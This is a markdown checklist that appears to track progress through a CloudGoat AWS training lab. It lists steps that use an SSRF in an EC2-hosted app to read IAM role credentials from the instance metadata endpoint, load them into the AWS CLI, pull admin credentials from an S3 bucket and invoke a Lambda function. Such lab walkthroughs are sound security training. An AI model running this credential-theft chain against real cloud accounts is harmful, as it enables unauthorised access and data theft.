# Relative path

- [ ] aws configure --profile solus
- [ ] aws lambda list-functions --profile solus
- [ ] aws configure --profile cglambda
- [x] http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name\>
- [x] Then Add the EC2 instance credentials to your AWS CLI credentials file at ~/.aws/credentials) // Implicit: Assume role
- [x] aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-\<cloudgoat_id\>/admin-user.txt ./
- [x] aws configure --profile cgadmin
- [ ] aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt

Steps: 8
Completed: 4

# Absolute path

- [ ] aws configure --profile solus
- [ ] aws lambda list-functions --profile solus
- [ ] aws configure --profile cglambda
- [ ] aws ec2 describe-instances --profile cglambda
- [x] Go to http://<EC2 instance IP\> // Access
- [x] http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ //SSRF
- [x] http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name\> //Exploit step
- [x] Then Add the EC2 instance credentials to your AWS CLI credentials file at ~/.aws/credentials) // Implicit: Assume role
- [ ] aws s3 ls --profile cgec2role
- [ ] aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-\<cloudgoat_id\>
- [x] aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-\<cloudgoat_id\>/admin-user.txt ./
- [ ] cat admin-user.txt
- [x] aws configure --profile cgadmin
- [ ] aws lambda list-functions --profile cgadmin
- [ ] aws lambda invoke --function-name cg-lambda-\<cloudgoat_id\> ./out.txt
- [ ] cat out.txt

Steps: 16
Completed: 6
